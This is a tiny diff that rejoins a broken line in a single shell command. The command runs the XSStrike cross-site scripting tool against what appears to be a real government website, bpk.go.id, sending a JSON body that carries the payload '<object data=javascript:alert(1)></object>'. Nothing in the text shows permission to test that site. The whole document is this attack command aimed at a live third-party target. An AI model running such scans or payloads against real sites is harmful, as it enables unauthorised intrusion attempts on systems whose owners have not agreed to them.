@@ -1,2 +1,1 @@
-python3 xsstrike.py -u 'https://bpk.go.id' --data '{"param":"<object data=javascript:alert(1)></object>"}' --headers 'Content-Type: applicatio
-n/json'
+python3 xsstrike.py -u 'https://bpk.go.id' --data '{"param":"<object data=javascript:alert(1)></object>"}' --headers 'Content-Type: application/json'
